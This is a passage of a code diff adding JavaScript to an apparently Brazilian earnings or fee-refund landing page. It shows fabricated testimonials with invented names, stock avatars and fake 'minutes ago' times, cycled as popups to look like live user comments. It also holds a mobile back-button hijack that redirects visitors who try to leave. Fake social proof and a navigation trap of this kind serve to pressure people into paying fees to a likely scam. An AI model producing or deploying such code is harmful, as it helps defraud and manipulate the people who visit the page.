+                { n: "Lucas A.", t: "Pix caiu em segundos, top demais ✅", m: "há 5 min", a: "https://xsgames.co/randomusers/assets/avatars/male/3.jpg" },
+                { n: "Ana R.", t: "Minha taxa voltou no primeiro saque ❤️", m: "há 75 min", a: "https://xsgames.co/randomusers/assets/avatars/female/1.jpg" },
+                { n: "Maria L.", t: "Fiz R$ 140 em 2 dias.", m: "há 77 min", a: "https://xsgames.co/randomusers/assets/avatars/female/2.jpg" },
+                { n: "Matheus C.", t: "Taxa devolvida logo na primeira meta 👌", m: "há 8 min", a: "https://xsgames.co/randomusers/assets/avatars/male/5.jpg" },
+                { n: "Juliana P.", t: "Plataforma segura, amei 🔒", m: "há 78 min", a: "https://xsgames.co/randomusers/assets/avatars/female/3.jpg" }
+            ];
+
+            let commentIndex = 0;
+            function showNextComment() {
+                const cContainer = document.getElementById("comment-popups");
+                if (!cContainer) return;
+
+                const c = comments[commentIndex];
+                const p = document.createElement("div");
+                p.className = "comment-popup";
+                p.innerHTML = `
+                <img decoding="async" src="${c.a}" alt="Foto de ${c.n}" class="avatar">
+                <div class="text"><strong>${c.n}</strong><br>${c.t}<span class="time">${c.m}</span></div>
+            `;
+                cContainer.appendChild(p);
+
+                void p.offsetWidth; // trigger reflow
+                p.classList.add("show");
+
+                setTimeout(() => p.classList.remove("show"), 6000);
+                setTimeout(() => p.remove(), 7000);
+
+                commentIndex = (commentIndex + 1) % comments.length;
+            }
+
+            // Show first comment quickly, then every 20 seconds
+            setTimeout(showNextComment, 2000);
+            setInterval(showNextComment, 20000);
+
+            // --- 5. REDIRECIONAMENTO BOTÃO VOLTAR (MOBILE) ---
+            var redirecionarPara = "../index.html";
+            var isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+            if (isMobile) {
+                history.pushState(null, null, location.href);
+                window.onpopstate = function () {
+                    window.location.href = redirecionarPara;
+                };
+            }
+        </script>
+</body>
+
+</html>
